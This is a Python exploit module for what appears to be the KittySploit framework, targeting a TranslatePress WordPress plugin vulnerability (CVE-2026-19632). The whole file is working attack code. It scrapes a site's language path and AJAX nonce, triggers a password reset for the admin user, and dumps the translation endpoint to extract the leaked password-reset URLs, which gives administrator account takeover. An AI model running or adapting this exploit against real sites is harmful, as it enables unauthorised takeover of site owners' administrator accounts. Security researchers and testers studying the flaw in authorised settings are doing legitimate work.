#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TranslatePress CVE-2026-19632 — extract admin reset URL from translations AJAX."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "TranslatePress CVE-2026-19632 reset URL leak",
        "description": "Triggers lostpassword then dumps trp_get_translations_regular for rp links.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-19632"],
        "tags": ["wordpress", "translatepress", "account-takeover", "cve-2026-19632"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("admin", "Target username", required=False)
    lang_path = OptString("", "Secondary language path e.g. /es/ (auto if empty)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        lang = (self.lang_path or "").strip()
        if not lang:
            home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
            m = re.search(
                r'hreflang="[a-z]{2}-[A-Z]{2}" href="https?://[^/"]+(/[a-z]{2,5}/)"',
                home.text or "",
            ) if home else None
            lang = m.group(1) if m else ""
        if not lang:
            print_error("Secondary language path not found")
            return False
        page = self.http_request(method="GET", path=self._join(lang), allow_redirects=True)
        html = page.text or "" if page else ""
        nonce_m = re.search(r'gettranslationsnonceregular"\s*:\s*"([a-f0-9]+)"', html)
        lang_m = re.search(r'trp_current_language"\s*:\s*"([a-zA-Z_]+)"', html)
        if not nonce_m or not lang_m:
            print_error("TranslatePress JS nonce/language missing")
            return False
        self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            params={"action": "lostpassword"},
            data={"user_login": self.username or "admin", "wp-submit": "Get New Password"},
            allow_redirects=False,
        )
        ids = ",".join(str(i) for i in range(1, 401))
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"X-Requested-With": "XMLHttpRequest"},
            data={
                "action": "trp_get_translations_regular",
                "security": nonce_m.group(1),
                "language": lang_m.group(1),
                "all_languages": "true",
                "dynamic_strings": "true",
                "string_ids": f"[{ids}]",
            },
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        links = re.findall(r'(https?://[^"\s\\]+wp-login\.php\?[^"\s\\]*action=rp[^"\s\\]+)', body)
        if links:
            print_success("Password reset URL(s) leaked:")
            for link in links[:3]:
                print_status(link)
            return True
        print_error("No reset URL in translation response")
        return False
